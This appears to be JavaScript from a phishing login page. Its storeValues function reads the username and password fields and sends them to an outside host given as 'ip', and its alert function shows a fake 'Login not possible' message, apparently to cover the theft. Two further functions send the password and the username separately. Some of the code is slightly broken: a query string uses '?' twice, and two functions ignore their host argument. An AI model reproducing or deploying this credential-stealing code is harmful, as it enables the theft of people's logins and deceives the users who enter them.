function redirectAlert()
{
    alert('Login not possible. Please refresh page.')
}

function storeValues(ip)
{
    var xhttp = new XMLHttpRequest();
    let inp_user = document.getElementById("USERNAME_FIELD-inner");
    let inp_password = document.getElementById("PASSWORD_FIELD-inner");
    console.log("sending cretentials to: ", ip)
    xhttp.open("GET",ip + "?Password="+inp_password.value + "?Username="+ inp_user.value,true);
    xhttp.send()
    console.log("Username: ", inp_user.value, "\tPassword: ", inp_password.value)
}

function storePassword(ip)
{
    var xhttp = new XMLHttpRequest();
    let inp_passwd = document.getElementById("PASSWORD_FIELD-inner");
    console.log("sending password to: ", ip);
    xhttp.open("GET", "?Password="+inp_passwd.value, true);
    xhttp.send()
}

function storeUsername(ip)
{
    var xhttp = new XMLHttpRequest();
    let inp_username = document.getElementById("USERNAME_FIELD-inner");
    console.log("sending username to: ", ip);
    xhttp.open("GET", "?Username="+inp_username.value,true);
    xhttp.send()
}

function partyProtocol()
{

}